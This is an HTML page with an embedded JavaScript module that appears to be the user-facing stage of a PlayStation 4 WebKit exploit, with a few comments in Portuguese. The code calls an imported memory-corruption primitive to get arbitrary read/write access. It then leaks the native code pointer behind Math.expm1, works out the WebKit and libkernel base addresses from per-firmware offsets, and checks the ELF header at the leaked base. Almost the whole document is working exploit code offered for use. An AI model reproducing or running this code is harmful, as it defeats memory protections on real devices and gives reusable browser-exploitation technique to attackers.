
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ps4 webkit</title>
<style>
  html, body {
    margin: 0; padding: 0;
    background: #000;
    color: #fff;
    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
    text-transform: lowercase;
  }
  #container { max-width: 520px; margin: 48px auto; padding: 24px; }
  #brand { font-size: 13px; font-weight: 600; letter-spacing: .2em; margin-bottom: 24px; opacity: .5; }
  #wrap { display: flex; flex-direction: column; gap: 10px; }
  #state { font-size: 20px; font-weight: 600; letter-spacing: -.01em; }
  #out {
    white-space: pre-wrap;
    font: 12px/1.6 Consolas, "Courier New", monospace;
    background: #000;
    border: 1px solid rgba(255,255,255,.15);
    border-radius: 6px;
    padding: 12px;
    min-height: 80px;
    text-transform: none;
    word-break: break-all;
  }
  .ok   { color: #5fffaa; }
  .bad  { color: #ff5555; text-decoration: underline; }
  .warn { color: #ffaa33; }
</style>
</head>
<body>
<div id="container">
  <div id="brand">mansoor0x</div>
  <div id="wrap">
    <div id="state">running webkit exploit...</div>
    <div id="out"></div>
  </div>
</div>

<script type="module">
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl   = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines   = [];

function mark(tag, detail, cls) {
    const esc = s => String(s == null ? "" : s)
        .replace(/&/g,"&amp;").replace(/</g,"&lt;");
    lines.push(tag + (detail != null && detail !== "" ? "  " + detail : ""));
    const c = cls ||
        (/FAIL|ERROR|THREW|BAD|ABORT/i.test(tag)   ? "bad"  :
         /WARN|SKIP|FALLBACK/i.test(tag)             ? "warn" :
         /\bOK\b|PASS|ACHIEVED|READY|BASE|PAIR/i.test(tag) ? "ok" : "");
    outEl.innerHTML = lines.map(function(l) {
        l = esc(l);
        const lc = /FAIL|ERROR|THREW|BAD|ABORT/i.test(l) ? "bad"
                 : /WARN|SKIP|FALLBACK/i.test(l)         ? "warn"
                 : /\bOK\b|PASS|BASE|READY|PAIR/i.test(l)? "ok" : "";
        return lc ? '<span class="'+lc+'">'+l+"</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }

/* ── Firmware ────────────────────────────────────────────────────── */
let { key, off } = offsetsFor(navigator.userAgent);
mark("FW", key || "(not a PS4 UA)");

/* Se o firmware atual não tem wk_*, herdar do 13.00 como referência.
   Não modifica ps4_offsets.js — apenas faz o merge aqui no HTML.     */
if (off && !off.wk_expm1_builtin) {
    const base = offsetsFor("Mozilla/5.0 (PlayStation 4 13.00) AppleWebKit/605.1.15");
    if (base.off && base.off.wk_expm1_builtin) {
        off = Object.assign({}, base.off, off);   // kernel addrs do FW real, wk_* do 13.00
        mark("OFFSETS-FALLBACK",
            "wk_* herdados de 13.00 (mesmo binário WebKit esperado)", "warn");
    }
}

if (!off) { state("no offsets", "bad"); mark("OFFSETS", "nenhum offset para este FW"); }

/* ── Primitive ───────────────────────────────────────────────────── */
state("running the primitive...", "warn");

const LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
let carrier;
try {
    carrier = await establishPrimitive({
        maxAttempts: 8,
        onEvent: (t, d, a) =>
            (LOUD.test(t) ? mark : () => {})(
                t, (a != null ? "["+a+"] " : "") + (d || ""))
    });
} catch(e) {
    mark("PRIMITIVE-THREW", e.message); state("primitive failed", "bad"); throw e;
}
mark("PRIMITIVE-OK", "host="+carrier.hostAddress+" fake="+carrier.fakeAddress
    +" attempts="+carrier.attempts);

/* ── Pair ────────────────────────────────────────────────────────── */
state("installing pair...", "warn");
installWindowP(carrier, {
    onEvent: (t, d) => (LOUD.test(t) ? mark : () => {})(t, d || "")
});
if (!window.p) { mark("PAIR-FAIL", "window.p not set"); state("pair failed","bad"); }
const p = window.p;
mark("PAIR-STATUS", "state="+pairStatus.state
    +" promoted="+pairStatus.promoted
    +" stage="+pairStatus.stage
    +(pairStatus.error ? " error="+pairStatus.error : ""));

/* ── Bases ───────────────────────────────────────────────────────── */
state("resolving bases...", "warn");
const cell     = p.leakval(Math.expm1);
mark("EXPM1-CELL", ""+cell);

const execPtr  = p.read8(cell.add32(0x18));
mark("NATIVE-EXEC", ""+execPtr);

const nativeCode = p.read8(execPtr.add32(off ? off.wk_JSFunction_m_function : 0x28));
mark("NATIVE-CODE", ""+nativeCode);

let webkitBase, libkernelBase;
if (off && off.wk_expm1_builtin) {
    webkitBase = nativeCode.sub32(off.wk_expm1_builtin);
    mark("WEBKIT-BASE", ""+webkitBase);

    /* Verificar ELF magic em webkitBase */
    const b = [p.read1(webkitBase.add32(0)), p.read1(webkitBase.add32(1)),
               p.read1(webkitBase.add32(2)), p.read1(webkitBase.add32(3))];
    const elfOk = b[0]===0x7f && b[1]===0x45 && b[2]===0x4c && b[3]===0x46;
    mark("ELF-MAGIC",
        b.map(x=>(x<16?"0":"")+x.toString(16)).join(" ") + (elfOk?" OK":" FAIL"),
        elfOk ? "ok" : "bad");

    if (off.wk___imp___error && off.k__error) {
        const errFn  = p.read8(webkitBase.add32(off.wk___imp___error));
        libkernelBase = errFn.sub32(off.k__error);
        mark("LIBKERNEL-BASE", ""+libkernelBase);
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        mark(aligned(webkitBase) && aligned(libkernelBase)
            ? "BASES-OK" : "BASES-WARN",
            "webkit="+webkitBase+" libkernel="+libkernelBase);
    }
} else {
    mark("BASES-WARN", "wk_expm1_builtin ausente — base indisponivel", "warn");
    mark("NATIVE-CODE-RAW", "ponteiro bruto: "+nativeCode
        +" (subtrair offset do expm1 manualmente)");
}

state("webkit userland ok", "ok");
</script>
</body>
</html>
